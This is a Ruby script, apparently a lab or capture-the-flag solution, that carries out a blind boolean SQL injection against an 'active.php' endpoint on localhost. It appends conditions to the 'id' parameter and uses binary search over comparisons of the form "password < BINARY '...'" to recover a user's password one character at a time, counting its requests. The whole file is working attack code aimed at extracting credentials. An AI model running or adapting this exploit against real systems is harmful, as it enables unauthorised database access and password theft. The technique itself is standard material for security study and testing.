require 'open-uri'
require 'pp'
require_relative './uri_encode_component'

USER_ID = ARGV[0] || 1

def guess_val max = nil
    current_min, current_max = fast_min_max_val(max){|val| yield val}
    loop do
        max_to_compare = (current_max - current_min)/2 + current_min
        is_smaller_than = yield max_to_compare
        if is_smaller_than
            current_max = max_to_compare
        else
            current_min = max_to_compare
        end
        break if current_max - current_min <=1
    end
    current_min
end

def fast_min_max_val max = nil
    current_max = 1
    current_min = 0
    loop do
        break if max && current_max >= max
        break if yield current_max
        current_min = current_max
        current_max*=2
    end
    return current_min, current_max
end
@request_count = 0

def request_val condition
    @request_count+=1;
    # puts 'sql req: ' + id_sql_val
    res = URI.open("http://localhost:1234/active.php?id=#{USER_ID} AND #{encodeURIComponent(condition)}").read
    return nil if res.include? 'error'
    (res.include? 'is active') || (res.include? 'suspended')
end

#code:
# mdp_length = guess_val{ |comp|
#     request_val "CHAR_LENGTH(password) < #{comp}" 
# }
# puts "mdp_length: #{mdp_length}"

# SQL_ESCAPE_CHARS = '%_$\''
SQL_ESCAPE_CHARS = '\\\''
current_password = ""
loop do
    #v2 mais pas le temps
    char_index = guess_val do |char_comp|
        char = char_comp.chr(Encoding::UTF_8)
        escaped_char = (SQL_ESCAPE_CHARS.include? char)?('\\' + char) : char
        print "\r#{current_password}#{char.sub(/[^[:print:]]/, ' ')}"; #visual
        request_val "password < BINARY '#{current_password}#{escaped_char}'"
    end
    break if char_index == 0
    current_password += char_index.chr(Encoding::UTF_8)
end

puts
puts "password: #{current_password}";
puts "with #{@request_count} requests";
